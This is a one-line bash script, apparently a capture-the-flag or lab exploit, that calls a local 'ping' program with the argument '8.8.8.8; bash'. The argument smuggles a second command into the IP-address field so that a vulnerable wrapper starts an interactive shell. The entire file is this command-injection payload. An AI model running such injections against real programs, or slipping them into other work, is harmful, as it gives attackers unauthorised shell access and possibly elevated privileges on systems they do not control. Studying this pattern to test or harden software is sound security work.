#!/usr/bin/env bash

./ping '8.8.8.8; bash'
